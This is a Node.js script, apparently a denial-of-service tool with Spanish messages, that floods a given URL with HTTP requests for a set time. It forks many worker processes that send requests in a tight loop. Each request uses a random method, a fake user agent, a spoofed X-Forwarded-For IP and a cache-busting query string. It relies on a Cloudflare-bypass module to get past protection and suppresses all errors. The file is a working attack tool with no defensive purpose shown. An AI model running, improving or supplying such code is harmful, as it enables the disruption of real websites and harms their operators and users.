require('events').EventEmitter.defaultMaxListeners = 0;
const cloudflare = require("cloudflare-bypasser")
const cf = new cloudflare();
const randomstring = require("randomstring")
const fakeUa = require("fake-useragent");
const cluster = require("cluster");
const colors = require("colors");
if(process.argv.length !== 5){
        console.log("CREADO POR |JORGE KHE MAMADAS|".inverse)
	console.log("node jorge.js url subprocesos (tiempo en segundos)".underline.red)
	process.exit()
	}
function flood_req(){
var char = randomstring.generate({
length:10,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
var charr = randomstring.generate({
length:7,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
ipq = function ranip(){
return Math.round(Math.random()*256)
}
var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
var Array_method = ['HEAD',  'GET',  'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL'];
var randommode = Array_method[Math.floor(Math.random()*Array_method.length)]
cf.request({
method:randommode,
resolveWithFullResponse: true,
headers:{
'User-Agent': fakeUa(),
'Upgrade-Insecure-Requests': '1',
'Connection':'Keep-Alive',
'Keep-Alive': 'timeout=10,max=100',
'Origin': 'http://' + char + '.com',
'Referrer': 'http://google.com/' + char,
'X-Forwarded-For': ip
},
url:process.argv[2]+"?"+charr
})

}
function th(){
setInterval(()=>{
flood_req()
})
}
if(cluster.isMaster){
	for (let i=0;i<process.argv[3];i++){
    cluster.fork()
    console.log(`El subproceso ${i+1} comenzó a atacar`.gray)
    }
    console.log("___________________________".red)
    console.log(" ///////////////".blue)
    console.log("| HTTP//HTTPS |/".blue)
    console.log("|_____________|/".blue)
    console.log("|   CARGAS™   |/".blue)
    console.log("|INSOPORTABLES|/".blue)
    console.log("|_____________|/".blue)
    console.log("___________________________".red)
}else{
	th()
	}

setTimeout(()=>{
console.log("Ataque Finalizado!".inverse)
process.exit()
},1000*process.argv[4])
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
